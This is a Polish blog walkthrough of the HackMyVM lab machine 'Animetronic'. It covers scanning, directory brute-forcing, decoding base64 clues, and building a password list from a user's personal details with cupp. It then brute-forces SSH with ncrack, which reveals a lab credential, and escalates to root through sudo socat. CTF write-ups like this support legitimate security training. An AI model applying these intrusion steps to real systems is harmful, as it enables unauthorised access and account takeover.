---
title: "Animetronic - ziyos"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - Animetronic
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Animetronic - ziyos
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Nazwa:|Animetronic|
|Autor:|[ziyos](https://hackmyvm.eu/profile/?user=ziyos)|
|Wypuszczony:|2023-12-11|
|Ściągnij:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Animetronic)|
|Poziom:|Łatwy|
|System:|Linux|
|Nauczysz się:| tworzenia haseł|

# 01. Wstęp
Niestety, trzeba było czekać ponad miesiąc, żeby ta maszynka była złamywalna. Można było to zrobić wchodząc przez GRUB, ale nie na tym polega zabawa. Teraz maszynka jest "złamywalna". Tym razem będzie bez opisów, same działania :smiley:
{: .text-justify}

```bash
netdiscover -P -r 172.16.1.0 | grep "PCS Systemtechnik GmbH"
# 172.16.1.189    08:00:27:07:16:90      1      60  PCS Systemtechnik GmbH
```
```bash
msf6 > db_nmap -T4 -A -p- 172.16.1.189
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-06 20:19 CET
[*] Nmap: Nmap scan report for animetronic.lan (172.16.1.189)
[*] Nmap: Host is up (0.00092s latency).
[*] Nmap: Not shown: 65533 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   256 59:eb:51:67:e5:6a:9e:c1:4c:4e:c5:da:cd:ab:4c:eb (ECDSA)
[*] Nmap: |_  256 96:da:61:17:e2:23:ca:70:19:b5:3f:53:b5:5a:02:59 (ED25519)
[*] Nmap: 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
[*] Nmap: |_http-title: Animetronic
[*] Nmap: |_http-server-header: Apache/2.4.52 (Ubuntu)
[*] Nmap: MAC Address: 08:00:27:07:16:90 (Oracle VirtualBox virtual NIC)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.8
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.92 ms animetronic.lan (172.16.1.189)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds
```
```bash
root@kali2023:~/hmv/animetronic# feroxbuster -u http://172.16.1.189 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.16.1.189
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      310c http://172.16.1.189/img => http://172.16.1.189/img/
200      GET       52l      340w    24172c http://172.16.1.189/img/favicon.ico
200      GET       42l       81w      781c http://172.16.1.189/css/animetronic.css
301      GET        9l       28w      310c http://172.16.1.189/css => http://172.16.1.189/css/
301      GET        9l       28w      309c http://172.16.1.189/js => http://172.16.1.189/js/
200      GET        7l     1513w   144878c http://172.16.1.189/css/bootstrap.min.css
200      GET     2761l    15370w  1300870c http://172.16.1.189/img/logo.png
200      GET       52l      202w     2384c http://172.16.1.189/
301      GET        9l       28w      317c http://172.16.1.189/staffpages => http://172.16.1.189/staffpages/
[##########>---------] - 5m    551648/1102744 0s      found:9       errors:1      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_172_16_1_189-1704569821.state ...
[##########>---------] - 5m    551649/1102744 0s      found:9       errors:1      
[###########>--------] - 5m    127975/220546  438/s   http://172.16.1.189/ 
[###########>--------] - 5m    126987/220546  435/s   http://172.16.1.189/img/ 
[###########>--------] - 5m    124964/220546  429/s   http://172.16.1.189/css/ 
[###########>--------] - 5m    122734/220546  422/s   http://172.16.1.189/js/ 
[####>---------------] - 2m     48949/220546  354/s   http://172.16.1.189/staffpages/
```
```bash
root@kali2023:~/hmv/animetronic# feroxbuster -u http://172.16.1.189/staffpages/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.16.1.189/staffpages/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      728l     3824w   287818c http://172.16.1.189/staffpages/new_employees
[####################] - 2m    220546/220546  0s      found:1       errors:0      
[####################] - 2m    220546/220546  2238/s  http://172.16.1.189/staffpages/               
```
```bash
root@kali2023:~/hmv/animetronic# exiftool new_employees 
ExifTool Version Number         : 12.67
File Name                       : new_employees
Directory                       : .
File Size                       : 160 kB
File Modification Date/Time     : 2023:11:27 18:11:43+01:00
File Access Date/Time           : 2023:12:24 13:51:30+01:00
File Inode Change Date/Time     : 2023:12:12 23:21:45+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
Image Width                     : 703
Image Height                    : 1136
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 703x1136
Megapixels                      : 0.799
```
```bash
root@kali2023:~/hmv/animetronic# echo -n ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo= | base64 -d
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
```
```text
http://172.16.1.189/staffpages/message_for_michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file 

personal_info.txt
```
```text
http://172.16.1.189/staffpages/personal_info.txt

name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming 
```
```bash
root@kali2023:~/hmv/animetronic# cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: michael
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 19101996


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: 


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: swimming, ahmed, yasser, adam
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 14216 words.
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```
```bash
root@kali2023:~/hmv/animetronic# ncrack -T5 -v -u michael -P michael.txt ssh://172.16.1.189

Starting Ncrack 0.7 ( http://ncrack.org ) at 2024-01-06 21:15 CET
Stats: 0:00:08 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 1.64% done; ETC: 21:23 (0:08:00 remaining)
Stats: 0:00:14 elapsed; 0 services completed (1 total)
Rate: 0.00; Found: 0; About 3.28% done; ETC: 21:22 (0:06:53 remaining)
Discovered credentials on ssh://172.16.1.189:22 'michael' 'leahcim1996'
Stats: 0:00:25 elapsed; 0 services completed (1 total)
Rate: 0.16; Found: 1; About 74.59% done; ETC: 21:16 (0:00:09 remaining)
(press 'p' to list discovered credentials)
Stats: 0:00:27 elapsed; 0 services completed (1 total)
Rate: 0.10; Found: 1; About 90.98% done; ETC: 21:16 (0:00:03 remaining)
(press 'p' to list discovered credentials)
Discovered credentials for ssh on 172.16.1.189 22/tcp:
172.16.1.189 22/tcp ssh: 'michael' '*****'
```
```bash
michael@animetronic:/home/henry$ cat Note.txt 
if you need my account to do anything on the server,
you will find my password in file named

aGVucnlwYXNzd29yZC50eHQK
```
```bash
echo aGVucnlwYXNzd29yZC50eHQK | base64 -d
```
```bash
henry@animetronic:~$ find / -type f -name henrypassword.txt 2>/dev/null 
/home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
```
```bash
cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt
******
```
```bash
su - henry
```
```bash
sudo socat stdin exec:/bin/bash
```